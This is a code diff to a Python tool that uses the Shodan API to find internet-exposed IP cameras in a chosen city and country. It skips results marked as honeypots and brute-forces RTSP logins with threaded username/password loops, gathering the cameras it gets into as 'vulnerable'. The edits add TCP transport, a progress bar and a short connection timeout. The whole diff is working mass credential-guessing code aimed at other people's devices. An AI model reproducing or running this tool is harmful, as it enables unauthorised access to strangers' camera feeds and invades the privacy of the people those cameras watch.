@@ -5,13 +5,17 @@ import shodan
 import argparse
 import cv2
 import threading
+import time
 from queue import Queue
 from prettytable import PrettyTable
 from colorama import init, Fore
-from time import sleep
+from tqdm import tqdm
 
 # Initialize Colorama
 init()
+
+# Force TCP for stability
+os.environ["OPENCV_FFMPEG_CAPTURE_OPTIONS"] = "rtsp_transport;tcp"
 
 # --- Constants & Configuration ---
 COLOURS = {
@@ -22,10 +26,6 @@ COLOURS = {
     "reverse": "\u001b[7m",
     "reset": "\u001b[0m"
 }
-
-# --- Helper Functions ---
-def clear_screen():
-    os.system('cls' if sys.platform == "win32" else 'clear')
 
 def log(msg, level="info"):
     color = COLOURS.get(level, COLOURS["info"])
@@ -46,16 +46,23 @@ def build_query(city, country):
     return query
 
 def check_rtsp_auth(ip, credentials):
-    """Probes a camera for valid credentials."""
+    """Probes a camera for valid credentials with timeout handling."""
     for cred in credentials:
-        # Construct URL with auth if provided
         url = f'rtsp://{cred}@{ip}' if cred else f'rtsp://{ip}'
+        
+        # Use a short timeout approach
         cap = cv2.VideoCapture(url)
-        # Set a short timeout (OpenCV doesn't handle timeouts natively well)
+        cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
+        
+        # Give it a short time to connect
+        start_time = time.time()
         ret, _ = cap.read()
         cap.release()
+        
+        # If read() succeeded quickly, we assume success
         if ret:
             return cred if cred else "No Auth Required"
+            
     return None
 
 def worker_thread(q, results_list, lock):
@@ -67,19 +74,16 @@ def worker_thread(q, results_list, lock):
         ip = target["ip_str"]
         
         if "honeypot" not in str(target):
-            # Explicit nested loop to try each combination
             found_auth = None
+            # Nested loop to test combinations
             for u in usernames:
                 for p in passwords:
-                    # Construct the credential pair
                     credential = f"{u}:{p}" if u else p
-                    
-                    # Probe with the current pair
                     if check_rtsp_auth(ip, [credential]):
                         found_auth = credential
-                        break # Exit password loop
+                        break 
                 if found_auth:
-                    break # Exit username loop
+                    break 
 
             if found_auth:
                 with lock:
@@ -90,8 +94,7 @@ def worker_thread(q, results_list, lock):
                         "country": target["location"].get("country_name", "N/A")
                     })
         q.task_done()
-        
-# --- Main Logic ---
+
 def main():
     args = get_args()
     api = shodan.Shodan(args.apikey)
@@ -105,7 +108,7 @@ def main():
         return
 
     targets = results['matches']
-    log(f"Found {len(targets)} potential targets. Starting probe...")
+    log(f"Found {len(targets)} targets. Starting probe...")
     
     q = Queue()
     vulnerable_cams = []
@@ -116,7 +119,8 @@ def main():
         t = threading.Thread(target=worker_thread, args=(q, vulnerable_cams, lock), daemon=True)
         t.start()
 
-    for target in targets:
+    # Submit targets to queue with progress bar
+    for target in tqdm(targets, desc="Probing Cameras", unit="cam"):
         q.put(target)
 
     q.join()
